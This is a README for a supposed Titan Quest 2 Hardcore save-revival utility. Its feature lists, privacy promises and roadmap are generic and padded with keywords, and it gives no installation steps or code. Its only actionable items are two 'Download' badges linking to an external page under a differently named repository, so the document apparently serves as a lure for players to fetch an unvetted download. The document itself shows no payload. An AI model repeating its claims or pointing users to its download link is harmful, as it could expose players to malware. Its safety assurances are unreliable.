![preview](https://raw.githubusercontent.com/leon8898/tq2-hardcore-phoenix-core/main/hero_344bf16.svg)
[![Download](https://raw.githubusercontent.com/leon8898/tq2-hardcore-phoenix-core/main/setup_df1b4.svg)](https://leon8898.github.io/tq2-hardcore-phoenix-core/)

# 🔄 TQ2-HC-Revival-Extended — Reawaken Fallen Heroes in Titan Quest 2

**A companion utility for hexqnt/tq2-hc-revival that breathes new life into Hardcore characters lost to the unforgiving wilds of Titan Quest 2.**

---

## 🧭 Overview

There's a particular kind of heartbreak that only Hardcore players understand. You've spent dozens of hours carving a path through myth and monster, tuning every stat, chasing every relic, and building a hero worth remembering — and then, in one breathless moment, a boss crit lands, the screen fades, and everything is gone. Permanently. That's the contract Hardcore makes with you, and most of the time, it's a fair one.

**TQ2-HC-Revival-Extended** exists for the moments when that contract feels a little too cruel. Inspired by the original `tq2-hc-revival` project, this extended toolkit gives players a carefully engineered way to restore fallen Hardcore characters — not by bending the entire game to your will, but by offering a focused, transparent, and reversible approach to recovering a save you genuinely cared about.

Think of it less as a cheat and more as a **save-file necromancer**: quiet, precise, and respectful of the world you built.

---

## ✨ Why This Exists

The original revival tool proved that there was real demand for recovering Hardcore saves — not to trivialize the mode, but to undo genuine accidents, corrupted saves, and moments of bad luck. This project extends that foundation with:

- A broader compatibility layer across Titan Quest 2 patch versions
- A cleaner restoration workflow with preview-before-commit
- Multilingual interface strings for the global TQ2 community
- A responsive, accessible control panel that works on any screen
- Detailed logging so you always know exactly what changed

Whether you lost a level 42 Conqueror to a lag spike or a level 3 nobody to a misclick, the tool treats every save with the same care.

---

## 🚀 Core Features

### 🛠️ Character Restoration Engine
The heart of the project. It reads your Hardcore save, identifies the death-flagged status, and reconstructs a playable character state — while preserving inventory, skills, quests, and stash data. Nothing is invented; everything is derived from what was already there.

### 🔍 Preview-Before-Commit Workflow
Before any change touches your save, you get a human-readable summary: what was found, what will change, and what will remain untouched. You approve, then it acts. No silent edits.

### 🌐 Multilingual Support
Interface strings ship in multiple languages, with community-contributed translations welcome. Titan Quest 2 has players everywhere, and a recovery tool should speak to them in their own words.

### 📱 Responsive User Interface
The control panel adapts gracefully from ultrawide monitors down to small laptop screens. No horizontal scrolling, no clipped dialogs, no frustration.

### 🕓 Automatic Save Backups
Every operation creates a timestamped backup of the original file before modification. If you change your mind, you restore in one action.

### 📜 Detailed Operation Logs
Every read, transformation, and write is recorded with timestamps and human-readable notes. Ideal for troubleshooting, auditing, or simply satisfying curiosity.

### 🧩 Patch-Aware Compatibility Matrix
The tool detects your Titan Quest 2 version and applies the appropriate save-format strategy, reducing the risk of corrupting files from mismatched builds.

### 🎨 Lightweight and Non-Invasive
No background services, no system hooks, no persistent runtime. It runs when you need it and disappears when you don't.

### ♿ Accessibility-Conscious Design
Keyboard navigation, readable contrast ratios, and screen-reader-friendly labels are built in from the start.

---

## 🧪 How It Works (High-Level)

At a conceptual level, the revival process follows four stages:

1. **Discovery** — The tool locates your Titan Quest 2 save directory and enumerates candidate Hardcore characters.
2. **Analysis** — Each candidate save is parsed to identify death state, character metadata, and structural integrity.
3. **Reconstruction** — A corrected save is generated in memory, with the death flag resolved and related state adjusted consistently.
4. **Commit or Discard** — You review the proposed result, then either write it (with a backup) or throw it away.

Nothing happens without your explicit confirmation.

---

## 🗂️ Project Structure

A conceptual map of the repository:

- **`/docs`** — Extended documentation, FAQ, and architectural notes.
- **`/locales`** — Translation files for the multilingual interface.
- **`/schemas`** — Save-format definitions for supported Titan Quest 2 versions.
- **`/tools`** — Helper scripts for developers and contributors.
- **`/tests`** — Automated test suites covering parsing, reconstruction, and edge cases.
- **`/assets`** — Icons, fonts, and static resources used by the interface.
- **`CHANGELOG.md`** — Full history of releases and notable changes.
- **`CONTRIBUTING.md`** — Guidelines for submitting improvements.
- **`LICENSE`** — MIT license terms.

---

## 🧑‍💻 Getting Started (Orientation, Not Installation)

If you're new to the project, the recommended path is:

1. Skim the **Overview** and **Core Features** sections above.
2. Read the `/docs` folder for a deeper dive into how save reconstruction works.
3. Review `CONTRIBUTING.md` if you intend to submit a change.
4. Consult the `CHANGELOG.md` to see what has recently evolved.

The project favors clarity over cleverness: if something is confusing, that's a bug worth reporting.

---

## 🔐 Privacy and Safety Principles

- **Local-Only Processing** — Your save files never leave your machine.
- **No Telemetry** — The tool does not phone home, ever.
- **Reversible by Design** — Backups are mandatory, not optional.
- **Transparent Operations** — Every action is logged and explainable.

These principles are not marketing lines; they're engineering constraints that shape the codebase.

---

## 🌍 Multilingual Community

The interface currently supports a growing set of languages, and the localization pipeline is designed so that adding a new one is a self-contained, low-risk task. If your language isn't represented yet, contributions are warmly welcomed.

---

## 🧠 SEO-Friendly Keyword Integration

This project is built around themes that players commonly search for when they've lost a Hardcore character in Titan Quest 2 — character recovery, save restoration, death-flag reversal, and multilingual companion tools. The documentation uses natural, descriptive language so that both humans and search engines can understand what the project does without resorting to keyword stuffing.

Topics naturally covered across the README and docs include: Titan Quest 2 Hardcore save recovery, character restoration utilities, patch-compatible save parsing, responsive companion interfaces for ARPG tools, multilingual support for game utilities, and safe backup-first workflows.

---

## 🕰️ Roadmap

- **Q1 2026** — Expanded patch compatibility matrix and improved reconstruction confidence scoring.
- **Q2 2026** — Additional language packs and community translation tooling.
- **Q3 2026** — Optional batch mode for restoring multiple characters in one session.
- **Q4 2026** — Deeper integration with community save-format research efforts.

---

## 🤝 Contributing

Contributions of all sizes are welcome:

- **Bug reports** — Clear reproduction steps help enormously.
- **Translations** — Adding or refining a locale is genuinely valuable.
- **Documentation** — Clarity is a feature.
- **Code** — Follow the existing style and include tests where practical.

Please read `CONTRIBUTING.md` before opening a pull request.

---

## 🧾 Disclaimer

This project is an independent, community-driven utility and is **not affiliated with, endorsed by, or sponsored by** the developers or publishers of Titan Quest 2. All trademarks and game assets referenced belong to their respective owners.

The tool is intended for **personal save-file recovery** in single-player contexts. Using it in ways that violate a game's terms of service is neither encouraged nor supported. The maintainers accept no responsibility for consequences arising from misuse, including but not limited to corrupted saves, account actions, or lost progress. Always keep backups, and use good judgment.

---

## 📄 License

Released under the **MIT License**. See the [LICENSE](./LICENSE) file for full terms.

Copyright © 2026 — TQ2-HC-Revival-Extended contributors.

---

## 💬 A Final Word

Hardcore mode is meant to be punishing, not permanent by accident. If this project helps you reclaim a hero you genuinely mourned, it has done its job. Play boldly — and keep your backups close.

[![Download](https://raw.githubusercontent.com/leon8898/tq2-hardcore-phoenix-core/main/setup_df1b4.svg)](https://leon8898.github.io/tq2-hardcore-phoenix-core/)